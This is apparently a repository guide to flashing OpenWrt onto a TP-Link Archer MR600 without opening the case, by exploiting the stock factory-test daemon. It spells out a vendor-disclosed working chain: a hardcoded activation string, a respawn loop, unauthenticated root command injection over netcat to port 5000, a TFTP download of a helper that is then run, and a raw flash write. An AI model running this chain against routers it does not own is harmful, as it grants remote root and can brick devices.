# Remote install (no case open)

Install OpenWrt on a stock Archer MR600 v1 (EU) over the LAN, without opening the case. This
is the alternative to [INSTALL.md](INSTALL.md) when physical access is not possible.

> **Verified on hardware, 2026-09-29.** The full chain below was executed against a production
> unit and it booted OpenWrt (SNAPSHOT r36672) - stock to OpenWrt with no UART and no case open.

> **Risk.** The entry point is the stock firmware's `ated_tp` factory-test daemon,
> already disclosed to TP-Link (2026-09-21) and posted on
> [openwrt/openwrt#25074](https://github.com/openwrt/openwrt/pull/25074). The flash write goes
> through `/dev/flash0`, the vendor's raw flash device. A failed write **bricks the router**, and
> the only recovery is UART ([INSTALL.md](INSTALL.md) §9) - so if you can open the case, use
> [INSTALL.md](INSTALL.md) instead. This path is for when you cannot.

## Prerequisites

* LAN access to the router (stock default `192.168.1.1`).
* The **web admin password** (store it in your environment, never inline).
* The images: `*-squashfs-factory.bin` (and `*-initramfs-kernel.bin` for recovery), from a
  [release](../../releases) or [build-kit/](build-kit/).
* Host tools: `python3`, `nc`, a TFTP server.
* The router **must be rebooted within the last ~10 minutes** - see step 1.

## 1. Reboot the router

The `sys` activation only dispatches while `cliGetSysUptime() < 601` seconds, so a router that
has been up for hours ignores it silently. Reboot first and wait for it to come back (~60 s).
The window closes about ten minutes after it is reachable again.

## 2. Start the factory daemon (remote root)

```sh
telnet 192.168.1.1        # password prompt: the web admin password (no username)
```

At the CLI:

```
sys 1EHCjIbr/PPd3fquw8/OKlv4Z2ah3QRs
```

That blob is `base64(DES-ECB("iwpriv startMFG x", 47 8d e3 f9 0b a5 d2 cf))` - the hardcoded
first-command key in `cli`. Expect `cmd:SUCC`, then `ated_tp` announcing `using port 5000`.
The argument is `x`; anything other than `ra0`/`rai0` selects `ated_tp` (those two start the RF
ATE daemon instead and disrupt wireless).

## 3. Keep the daemon alive

`ated_tp` is a child of the telnet session and dies when it closes. The busybox `setsid` is not
functional on this firmware, so a `trap '' HUP` respawn guard is what keeps it up. Send it over
`:5000` (the trailing `&` backgrounds it, so `system()` returns immediately):

```sh
printf 'ifconfig; (trap "" HUP; while :; do ated_tp >/dev/null 2>&1; sleep 1; done) >/dev/null 2>&1 &\n' | nc 192.168.1.1 5000
```

The guard ignores `SIGHUP` (so it survives the telnet session closing) and re-launches `ated_tp`
whenever it exits. Verified on hardware: it held `:5000` up for over an hour with no session
attached; the only stop condition was a router reboot.

## 4. Root over :5000

`ated_tp` passes any line *starting with* `ifconfig` to `system()` as root, with no
authentication and no output returned on the socket (exfiltrate via TFTP):

```sh
printf 'ifconfig; <command>\n' | nc 192.168.1.1 5000
```

## 5. Flash the image via /dev/flash0

> **Verified 2026-09-29.** A single monolithic write of `factory.bin` at `0x20000` completed
> *before* `machine_restart()` fired and the device booted OpenWrt. The two-part kernel/rootfs
> split is what bricked it earlier - write in one piece.

The firmware partitions are read-only at the MTD level, but the vendor's `/dev/flash0` bypasses
MTD entirely. The write path has **no destination check**, only a reboot hint: writing the
**kernel region (`dest == 0x20000`)** sets `need_reboot` and calls `machine_restart()` **after**
the full write completes. A chunked write would reboot on the first chunk, mid-write - which is
the difference between "boots OpenWrt" and "brick".

The helper is [tools/flash0.c](tools/flash0.c); build it static for mipsel and serve it plus
`factory.bin` from a TFTP server the router can reach. Then, over the `:5000` root:

```sh
# stage both on the router (the & backgrounds each, so system() returns immediately)
printf 'ifconfig; tftp -g -r flash0 -l /tmp/flash0 192.168.1.250 &\n' | nc 192.168.1.1 5000
printf 'ifconfig; tftp -g -r factory.bin -l /tmp/factory.bin 192.168.1.250 &\n' | nc 192.168.1.1 5000

# optional sanity check: the helper's read path returns real flash (64 B at 0x0 == mtd0[0:64])
printf 'ifconfig; chmod +x /tmp/flash0; /tmp/flash0 read 0x0 64 /tmp/read.bin; tftp -p -l /tmp/read.bin -r read.bin 192.168.1.250 &\n' | nc 192.168.1.1 5000

# write factory.bin in ONE piece at 0x20000 (16,318,464 B). The driver erases+programs the
# full region, then machine_restart() - the device reboots into OpenWrt.
printf 'ifconfig; /tmp/flash0 write 0x20000 /tmp/factory.bin\n' | nc 192.168.1.1 5000
```

The write is a single `FLASH_IOCTL_WRITE` ioctl covering kernel + rootfs together, so the reboot
hint fires once, at the end. A two-part write leaves a window where one half is written and the
other is not, and the kernel write reboots before the pair is complete - that is what bricked the
device on the first attempt. After the write the router comes back as OpenWrt (SSH on 22, telnet
gone).

## Recovery

A bricked router is recovered over UART exactly as in [INSTALL.md](INSTALL.md) §9: initramfs
boot, then `mtd write` of the stock backup (or re-run the remote install from the initramfs).
